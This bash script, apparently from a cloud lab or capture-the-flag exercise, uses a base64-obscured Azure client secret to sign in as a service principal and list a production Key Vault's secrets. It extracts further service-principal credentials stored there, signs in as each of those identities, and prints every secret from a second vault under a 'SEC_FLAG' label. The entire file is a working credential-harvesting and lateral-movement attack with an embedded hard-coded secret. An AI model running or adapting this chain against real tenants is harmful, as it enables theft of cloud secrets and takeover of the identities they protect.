#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SYNC_ID=58108da8-044e-4d7e-9a46-92e6179b30be
SYNC_SEC=$(printf %s "fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==" | base64 -d)
sp_tok(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$3/.default" | jq -r '.access_token'; }
PVT=$(sp_tok "$SYNC_ID" "$SYNC_SEC" "https://vault.azure.net")
echo "PVT_LEN=${#PVT}"
IDS=$(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value[]?.id')
for sid in $IDS; do
  js=$(curl -s "${sid}?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value')
  aid=$(echo "$js" | jq -r '.appId? // empty'); asec=$(echo "$js" | jq -r '.clientSecret? // empty')
  nm=$(echo "$sid" | sed 's#.*/##')
  [ -z "$aid" ] && continue
  echo "### $nm ($aid) -> kv-tbl-sec"
  TT=$(sp_tok "$aid" "$asec" "https://vault.azure.net")
  SL=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TT")
  echo "$SL" | jq -r '.value[]?.id' | while read s2; do
    [ -z "$s2" ] && continue
    n2=$(echo "$s2" | sed 's#.*/##')
    v2=$(curl -s "${s2}?api-version=7.4" -H "Authorization: Bearer $TT" | jq -r '.value')
    echo "SEC_FLAG $n2 = $v2"
  done
done
echo "ALL_DONE"
